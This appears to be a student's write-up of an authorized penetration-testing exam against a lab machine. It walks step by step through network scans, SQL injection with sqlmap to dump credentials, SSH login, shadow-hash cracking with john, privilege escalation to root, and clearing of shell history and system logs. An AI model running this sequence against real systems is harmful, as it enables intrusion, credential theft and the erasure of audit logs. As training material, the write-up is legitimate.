# Penetration Testing Final Exam at **SALACYBER**

**Author:**: Nin Kanong
**Date:**: 8/10/2025
**Target:**: 192.168.127.129 (NAT) 
**Instructor authorization:** Yes — written permission obtained on 08/oct/2025 until 12/oct/2025

## Purpose
Perform an authorized penetration test of the target for the final exam. Document findings, produce reproduciable commands, and deliver a remediation report.

## Scope
- Allowed targets: <IP ranges / hostnames>
- Disallowed: <any systems out of scope>
- Time window: <start - end>

## Deliverables
1. Full written report (reports/full_report.md)
2. Executive summary (reports/executive_summary.md)
3. Scan files (scans/)
4. Evidence screenshots and logs (evidence/)
5. Cleanup proof (cleanup.md)

## How to use this folder
- `notes.md` — live notes during test
- `commands/` — library of commands used
- `evidence/` — screenshots, captured outputs



# Performing Penetration Testing

## Target(Don't know IP)
<img width="597" height="364" alt="image" src="https://github.com/user-attachments/assets/66fc96e1-8c73-4555-8ccd-374c652dbc1b" />

## Information Gathering
- First if don't know target IP let check:
- Scan IP in local and first we need to create Folder name `SEHE` to make we easy to check and find latter:
````
mkdir SEHE
cd SEHE
````
<img width="255" height="127" alt="image" src="https://github.com/user-attachments/assets/4257d105-36ae-489a-8ba8-f285195ce763" />

- Create flow target:
````
mkdir Information_Gathering
mkdir Enumeration
mkdit Exploitation
mkdir Post_Exploitation
````
<img width="704" height="505" alt="image" src="https://github.com/user-attachments/assets/beef684a-06ee-451c-9bf4-0cbdb36d7e7a" />


- Scan with `nmap`:
````
cd Information_Gathering
````
<img width="299" height="58" alt="image" src="https://github.com/user-attachments/assets/b87d257a-b20b-448c-8cea-f58196581d1e" />

- Scan with `nmap`:
````
nmap 192.168.127.0/24
ls
cat scan_range.txt
````
<img width="1067" height="768" alt="image" src="https://github.com/user-attachments/assets/bedba042-6e7b-42b7-8518-36a236cf5ab0" />

### To see detals than this:
````
nmap 192.168.127.0/24 -sV -T4 -oN details_scan.txt
````
<img width="870" height="769" alt="image" src="https://github.com/user-attachments/assets/3d52770e-1f7d-4c1b-81a7-c5d3a7dcb991" />

<img width="960" height="561" alt="image" src="https://github.com/user-attachments/assets/386a74f9-c69c-42e9-96cc-ef1ff9e729b9" />

- In this we found `Target IP`.


###  More Detailed Nmap Scans
#### Full TCP port scan:
````
nmap -p- --min-rate 10000 192.168.127.136 -oN full_ports.txt
````
<img width="659" height="417" alt="image" src="https://github.com/user-attachments/assets/75457b52-5596-474e-b086-96a7857680ef" />


#### Detailed service/version detection on all open ports
````
nmap -sV -sC -A -O -p 21,22,80,139,445,8000,8088 192.168.127.136 -oN detailed_scan.txt
````
<img width="1023" height="711" alt="image" src="https://github.com/user-attachments/assets/a9c16fbe-19b6-4fe0-9b7b-9822959f203e" />

<img width="1033" height="355" alt="image" src="https://github.com/user-attachments/assets/7b72cd9e-849f-4429-9728-c708fdd13642" />

#### UDP top ports scan
````
nmap -sU --top-ports 100 192.168.127.136 -oN udp_scan.txt
````
<img width="905" height="252" alt="image" src="https://github.com/user-attachments/assets/f1199107-d767-42f1-82e7-2d6b10f197f4" />

- All of this we find open port.
---



## Enumeration
- In this we do enumerate to find vulnerability


### FTP Enumeration (Port 21)
#### In this we test with anonimous login:
````
ftp 192.168.127.136
````
<img width="364" height="228" alt="image" src="https://github.com/user-attachments/assets/bf46a759-5ea2-454b-bc97-74497ebf9cba" />

- So in this our target close `anonymous login` we need to find username and password.

#### Check for FTP vulnerabilities
````
nmap --script ftp-* -p 21 192.168.127.136
````
<img width="584" height="285" alt="image" src="https://github.com/user-attachments/assets/0e60d343-ab46-41c5-b86c-4d055fa218d5" />

#### Full service + useful FTP NSE scripts
````
nmap -p 21 --script=ftp-anon,ftp-syst,ftp-vsftpd-backdoor,ftp-bounce,ftp-brute -sV 192.168.127.136 -T4 -oN Full_FTP.txt
````
<img width="1009" height="320" alt="image" src="https://github.com/user-attachments/assets/2a2d0e87-90d0-4711-82fe-c1e55a67339a" />

- So in FTP have vulnerable and diefficult to brute force, and we need to find vulnerable others service.


### SMB Enumeration (Port 139/445)
#### List share
````
smbclient -L //192.168.127.136 -N
````
<img width="701" height="69" alt="image" src="https://github.com/user-attachments/assets/022742fe-6216-46c3-8bd2-d6f1de52d632" />

- So in this hae no vulnerabe.

#### Check for anonymous access
````
smbclient //192.168.127.136/public -N
````
<img width="707" height="66" alt="image" src="https://github.com/user-attachments/assets/10b47cbd-c873-4df7-ae6f-659eecc49a6e" />

#### Enumerate SMB
````
enum4linux -a 192.168.127.136
````
<img width="911" height="594" alt="image" src="https://github.com/user-attachments/assets/5a1eb1a7-279b-41e0-9c6a-fb421865c152" />

- So in this have no password.

#### Nmap SMB scripts
````
nmap --script smb-* -p 139,445 192.168.127.136
````
<img width="972" height="477" alt="image" src="https://github.com/user-attachments/assets/4199ee56-f52d-48b1-8be7-0a953d9747ff" />



### SSH Enumeration (Port 22)
#### Check SSH configuration
````
nmap --script ssh2-enum-algos -p 22 192.168.127.136
````
<img width="592" height="810" alt="image" src="https://github.com/user-attachments/assets/7a5a4604-b3be-434a-bf3a-b9c248dd8ec9" />

````
nmap --script ssh-auth-methods -p 22 192.168.127.136 -oN SMB_Scan.txt
````
<img width="609" height="256" alt="image" src="https://github.com/user-attachments/assets/100facd6-33a1-4748-b552-cfc9269eeeda" />



#### Check for known vulnerabilities
````
searchsploit openssh 7.9
````
<img width="332" height="84" alt="image" src="https://github.com/user-attachments/assets/1be6a934-bd40-477e-a134-c96d3db48055" />


### NetBIOS Enumeration
#### # NetBIOS name lookup
````
nmblookup -A 192.168.127.136
````
<img width="436" height="218" alt="image" src="https://github.com/user-attachments/assets/8927791e-1b5b-46c5-8a4d-d91858857db2" />

#### SNMP check (if any UDP ports found)
````
snmp-check 192.168.127.136
````
<img width="659" height="148" alt="image" src="https://github.com/user-attachments/assets/eb3d0c3e-06de-4b4a-a2c6-77a430b58d7e" />


### Web Application Enumeration
####  Check each web service manually
````
curl -v http://192.168.127.136
curl -v http://192.168.127.136:8000
curl -v http://192.168.127.136:8088
````
<img width="1900" height="726" alt="image" src="https://github.com/user-attachments/assets/f474f77c-ab54-43c0-a845-6d81fe8caf5b" />

<img width="520" height="636" alt="image" src="https://github.com/user-attachments/assets/4e9a15ef-76fa-4009-82df-22fe9afa1c8e" />


### Web Service Enumeration
#### Directory brute forcing on each port
````
gobuster dir -u http://192.168.127.136 -w /usr/share/wordlists/dirb/common.txt -o http_80_scan.txt
gobuster dir -u http://192.168.127.136:8000 -w /usr/share/wordlists/dirb/common.txt -o http_8000_scan.txt
gobuster dir -u http://192.168.127.136:8088 -w /usr/share/wordlists/dirb/common.txt -o http_8088_scan.txt
````
<img width="847" height="481" alt="image" src="https://github.com/user-attachments/assets/b39404eb-274e-4de9-acd0-463e48fa1e87" />

- If we click on it:
<img width="1123" height="745" alt="image" src="https://github.com/user-attachments/assets/4c4727aa-a3ad-496b-ab7a-1041f154fe8e" />

<img width="899" height="462" alt="image" src="https://github.com/user-attachments/assets/f801e378-ea73-4cb9-b7c2-b629f4a5a408" />

- In this we have only one key to find vulnerability or username.
- In this we need to try a lot command to get username for brute force.


````
gobuster dir -u http://192.168.127.136/store/ -w /usr/share/wordlists/dirb/common.txt -x php
````
<img width="806" height="586" alt="image" src="https://github.com/user-attachments/assets/fa2c8a1e-8454-4a6c-937a-1a76e830dc3b" />


- Type this in browser: http://192.168.127.136/store/
<img width="1116" height="675" alt="image" src="https://github.com/user-attachments/assets/e312f262-2cc9-41d9-b943-33bbb32d7548" />

- But in this we have now vulnerable.

- Type this n browser: http://192.168.127.136/store/admin/vieworders.php
<img width="1102" height="657" alt="image" src="https://github.com/user-attachments/assets/8060288a-d1a2-4439-bcd3-43db671a3754" />

192.168.127.136/store/admin/vieworders.php?id=1
- In this is a key to find username and password.


- Use with `SQLMAP`
````
sqlmap -u "http://192.168.127.136/store/admin/vieworders.php?id=1" --dbs --batch
````
<img width="1498" height="760" alt="image" src="https://github.com/user-attachments/assets/c505133d-7af9-4bbc-a13e-c2f20223b96a" />

- Next we need to Enumerate Tables in onlineorder
````
sqlmap -u "http://192.168.127.136/store/admin/vieworders.php?id=1" -D onlineorder --tables --batch
````
<img width="1900" height="558" alt="image" src="https://github.com/user-attachments/assets/e46014a7-5e6d-4ebc-a62b-ae51b9dd792b" />

<img width="1415" height="481" alt="image" src="https://github.com/user-attachments/assets/9e93fc62-3769-4b2a-ab75-1dc4c56a1c05" />

- Tables, Dump Credentials
````
sqlmap -u "http://192.168.127.136/store/admin/vieworders.php?id=1" -D onlineorder -T users --dump --batch
````
<img width="1607" height="747" alt="image" src="https://github.com/user-attachments/assets/f12c21ac-137b-43da-98f6-cca4f695cead" />


#### Dump Everything Automatically
sqlmap -u "http://192.168.127.136/store/admin/vieworders.php?id=1" -D onlineorder --dump --batch
````
sqlmap -u "http://192.168.127.136/store/admin/vieworders.php?id=1" -D onlineorder --dump --batch
````
<img width="1348" height="796" alt="image" src="https://github.com/user-attachments/assets/c50688ea-41f6-4e35-9b31-7e9decb519cf" />

<img width="1734" height="693" alt="image" src="https://github.com/user-attachments/assets/eb649793-d193-4a05-b518-5cf8faa3df49" />

<img width="1568" height="792" alt="image" src="https://github.com/user-attachments/assets/8a9257fb-31d9-46d8-8219-b7bc4e30e71a" />

<img width="1708" height="789" alt="image" src="https://github.com/user-attachments/assets/20c93dce-9c45-4d93-8db3-ad586af7d64d" />

<img width="1486" height="357" alt="image" src="https://github.com/user-attachments/assets/4fcfd57d-7347-401b-b6ff-d2f113faac77" />

- This will automatically extract all tables and data without manual queries.
- so in this we see username and password.
----







## Exploitation

### Database dump
````
sqlmap -u "http://192.168.127.136/store/admin/vieworders.php?id=1" --dump-all --batch
````
<img width="1730" height="796" alt="image" src="https://github.com/user-attachments/assets/ef265ed4-d130-43ba-93c4-1dc0b32fe133" />

- So in this we found username and password so les exploit it.



### Login with FTP
````
ftp 192.168.127.136
````
<img width="442" height="259" alt="image" src="https://github.com/user-attachments/assets/eca098d2-ef1a-40df-ad4c-520c6144faf0" />

````
Username: sehe
password: SecureP@ssHere!
````
<img width="585" height="361" alt="image" src="https://github.com/user-attachments/assets/8881be47-3f6d-4cb6-aea5-81251d47a35d" />

- If it not work we login with ssh.
---


### Login with SSH
````
ssh sehe@192.168.127.136
````
<img width="854" height="333" alt="image" src="https://github.com/user-attachments/assets/604635a7-a657-4810-821f-f984767672dd" />

````
Username: sehe
password: SecureP@ssHere!
````

---


## Post Exploitation
- After we login with ssh:
````
whoami
ls
````
<img width="893" height="302" alt="image" src="https://github.com/user-attachments/assets/5663eedc-f449-494a-91e9-bd18a5e199b0" />

````
ls
tar -xzvf passwd.tar.gz
tar -xzvf shadow.tar.gz
````
<img width="544" height="188" alt="image" src="https://github.com/user-attachments/assets/de3747dd-6ab1-43cf-92c9-2832d5a5a2d6" />

### Check file
````
cat user_passwd
cat user_shadow
````
<img width="1353" height="755" alt="image" src="https://github.com/user-attachments/assets/bf5fc7b2-8aed-4cbc-9dd5-de35ef0cc481" />

- In this we need to brute force with `hash`.

#### Brute Force
````
mousepad unshadow.txt
````
<img width="808" height="104" alt="image" src="https://github.com/user-attachments/assets/e0d26c66-bce5-46a1-82f5-45cda5da424c" />

````
chenben:$6$MesXtkHCJvHshgf3$GAiTreqipBj9vW0NZNalhj9J.ERvgRw4dN9lupddPlvph.YcTvPCrF1YPUN3ISnnhM56d3GTDnKEJRjb1Sd7Z0:20040:0:99999:7:::
````
<img width="1816" height="755" alt="image" src="https://github.com/user-attachments/assets/3ff64a17-e871-4142-a494-1fd0bde544f9" />

- To make sure what `format` that we should use go to this website: https://hashes.com/en/tools/hash_identifier
<img width="1827" height="874" alt="image" src="https://github.com/user-attachments/assets/d6d72a04-0ce6-47fc-b6fb-140387da98e2" />

<img width="1820" height="441" alt="image" src="https://github.com/user-attachments/assets/18ae7075-0f57-4dac-9b53-a67fa624789c" />

- So in this we use with `sha512crypt`:
````
john --format=sha512crypt unshadow.txt --wordlist=/usr/share/wordlists/rockyou.txt
````
<img width="1484" height="414" alt="image" src="https://github.com/user-attachments/assets/16783b64-4617-4e0e-9d81-1d3abc217f3d" />

- In our target:
````
su chenben
````
<img width="337" height="110" alt="image" src="https://github.com/user-attachments/assets/cacffaca-b736-43bc-8a43-3397df0282c6" />

````
Password: deathnote
````


````
whoami
cd /home/chenben
ls -la
cat user_flag.txt
````
<img width="1058" height="667" alt="image" src="https://github.com/user-attachments/assets/95d55571-f85b-4863-b3ad-a06ec43b9189" />

- So we got `user_flag.txt`.
---

### root flag
````
ls
mkdir temp
cp README_HEHE/root_shadow.tar.gz temp/
find / -perm -4000 -type f 2>/dev/null
ls -la /usr/bin/pkexec
````
<img width="1018" height="782" alt="image" src="https://github.com/user-attachments/assets/9254c20f-51bb-4696-aba9-3b7e36c56c13" />

````
whoami
tar -xzvf temp/root_shadow.tar.gz
cat shadow
````
<img width="810" height="777" alt="image" src="https://github.com/user-attachments/assets/d87fe0e0-4b86-4403-b84c-179cf6b84a88" />

- We need to brute force this `hash`:
````
echo 'adm-teeyar:$1$PNjc2r50$UWjLLdJg.SSyIfHfmpwkk.:20054:0:99999:7:::' > adm-teeyar.txt
ls
````
<img width="1618" height="246" alt="image" src="https://github.com/user-attachments/assets/fc1b7039-4287-485e-8e75-311e93e68e0f" />

- We need to identify `hash`:
<img width="1833" height="713" alt="image" src="https://github.com/user-attachments/assets/db96bcb9-98e0-4898-9aa9-66c9b1619ac5" />

<img width="1815" height="478" alt="image" src="https://github.com/user-attachments/assets/ed48319e-57ba-4a75-b78c-e9fd4259373d" />

````
john --format=md5crypt adm-teeyar.txt --wordlist=/usr/share/wordlists/rockyou.txt
````
<img width="1610" height="369" alt="image" src="https://github.com/user-attachments/assets/4afd3a6b-2328-4aca-b0ee-6f0e925eade5" />

- To check it: 
````
john --show adm-teeyar.txt
````
<img width="773" height="225" alt="image" src="https://github.com/user-attachments/assets/61d82fa1-eddb-4ba9-86cb-17dcedc18128" />

````
su adm-teeyar
whoami
sudo /bin/bash
ls
cd /root
ls
cat root_flag.txt
````
<img width="837" height="702" alt="image" src="https://github.com/user-attachments/assets/91024874-6871-4266-a11d-db5245fa1599" />

- So in this we got `root_flag.txt`.


## Covering Track
- In our target system
````
history
history -c
````
<img width="399" height="329" alt="image" src="https://github.com/user-attachments/assets/5cc7a5a0-f912-49d3-8304-0c1d997eb5f1" />

### List all log files in /var/log
````
ls -la /var/log/
````
<img width="694" height="744" alt="image" src="https://github.com/user-attachments/assets/0f2356f4-20bd-4f85-834d-074e53683fc4" />


###  Check web server logs (if Apache or Nginx)
````
ls -la /var/log/apache2/ 2>/dev/null
ls -la /var/log/nginx/ 2>/dev/null
````
<img width="784" height="616" alt="image" src="https://github.com/user-attachments/assets/cc751cac-8f8b-4ac9-910a-bf873e869bbb" />

<img width="703" height="477" alt="image" src="https://github.com/user-attachments/assets/ed695979-a5df-4551-bed6-1f93b2c592ca" />



###  Check auth logs (SSH, sudo, login attempts)
````
cat /var/log/auth.log 2>/dev/null | grep -i "sehe\|chenben\|adm-teeyar\|192.168.127.136"
cat /var/log/secure 2>/dev/null | grep -i "sehe\|chenben\|adm-teeyar"
````
<img width="1094" height="103" alt="image" src="https://github.com/user-attachments/assets/9dd83bda-61f6-4c9e-9149-1323492e0b5b" />


### Check recent login history
````
last | grep -i "sehe\|chenben\|adm-teeyar"
lastlog | grep -i "sehe\|chenben\|adm-teeyar"
````
<img width="810" height="395" alt="image" src="https://github.com/user-attachments/assets/836c2ee2-c848-44ff-9c62-f861d9caf444" />



### Check bash history of target users (if accessible)
````
cat /home/sehe/.bash_history 2>/dev/null
cat /home/chenben/.bash_history 2>/dev/null
cat /root/.bash_history 2>/dev/null
````
<img width="618" height="798" alt="image" src="https://github.com/user-attachments/assets/2baa6019-0681-4b4b-b0c6-53bac64ab61b" />

<img width="656" height="83" alt="image" src="https://github.com/user-attachments/assets/4ac00a72-5887-491a-a220-d7968a0afa0d" />

### clear current session
````
history -c
````
<img width="974" height="435" alt="image" src="https://github.com/user-attachments/assets/5e3e350a-e7cc-48d8-82f0-a05fcf6a4cb1" />

### Cleared System Logs
````
> /var/log/auth.log
> /var/log/syslog
> /var/log/apache2/access.log
> /var/log/apache2/error.log
````
<img width="524" height="133" alt="image" src="https://github.com/user-attachments/assets/c884f1ea-223a-4b74-9fe1-61991f17eea1" />

### View log
````
cat /var/log/auth.log
grep -i "sehe\|chenben\|adm-teeyar\|192.168.127.136" /var/log/auth.log
less /var/log/syslog
cat /var/log/apache2/access.log
cat /var/log/apache2/error.log
````
<img width="1115" height="285" alt="image" src="https://github.com/user-attachments/assets/afd3265d-7f7d-4938-bdad-800e2eceb8ad" />



----











